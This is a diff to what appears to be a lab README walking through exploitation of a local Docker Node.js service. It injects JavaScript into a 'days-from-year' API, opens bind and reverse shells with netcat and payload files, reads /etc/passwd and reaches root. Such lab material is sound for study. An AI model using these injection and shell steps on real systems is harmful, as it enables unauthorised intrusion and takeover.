@@ -13,16 +13,19 @@ docker-compose up
 discover vulnerability:
 
 `curl -X POST --data year="2016" http://localhost:8080/api/days-from-year/`
+
 `curl -X POST --data year="res.write('foobar')" http://localhost:8080/api/days-from-year/`
 
 try1 (not working, new listening ports not exposed):
 
 `curl -X POST --data "@shell.js" http://localhost:8080/api/days-from-year/`
+
 `curl "http://localhost:8000/?cmd=cat%20/etc/passwd"`
 
 try2:
 
 `nc -lvp 9999`
+
 `curl -X POST --data "@rshell.js" http://localhost:8080/api/days-from-year/`
 
 ```
@@ -49,6 +52,7 @@ uid=0(root) gid=999(node) groups=999(node)
 ```
 
 note: for increased stability run this in the VM before running the exploit, Docker mounts /proc/sys in ro so the exploit tends to freeze the VM.
+
 ```
 sudo -s
 echo 0 > /proc/sys/vm/dirty_writeback_centisecs
